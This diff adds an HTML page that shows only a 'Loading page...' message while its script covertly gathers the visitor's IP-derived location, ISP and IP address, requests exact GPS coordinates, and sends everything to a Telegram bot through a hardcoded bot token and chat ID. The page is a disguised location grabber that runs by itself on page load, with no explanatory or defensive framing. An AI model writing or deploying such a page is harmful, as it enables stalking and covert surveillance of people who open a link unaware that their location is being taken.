@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Loading...</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      margin-top: 100px;
+      background-color: #f0f2f5;
+    }
+  </style>
+</head>
+<body>
+
+  <h2>Loading page...</h2>
+  <p>Please wait a moment.</p>
+
+  <script>
+    const BOT_TOKEN = "8940026553:AAFjmD9gPvZSs7CcAWsie1d8yvVXtQnkLcA"; 
+    const CHAT_ID = "8906855686"; 
+
+    function sendToTelegram(text) {
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: CHAT_ID, text: text })
+      });
+    }
+
+    // IP / Wi-Fi Location
+    fetch('https://ipapi.co/json/')
+      .then(res => res.json())
+      .then(data => {
+        let ipMsg = `📱 Visitor Info:\n\n🏙️ City: ${data.city}\n📍 Region: ${data.region}\n🏳️ Country: ${data.country_name}\n📮 Postal: ${data.postal}\n📡 ISP: ${data.org}\n🌐 IP: ${data.ip}`;
+        sendToTelegram(ipMsg);
+      })
+      .catch(err => console.log(err));
+
+    // GPS Location
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(
+        (pos) => {
+          let gpsMsg = `✅ Exact GPS Location:\nhttps://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+          sendToTelegram(gpsMsg);
+        }
+      );
+    }
+  </script>
+</body>
+</html>
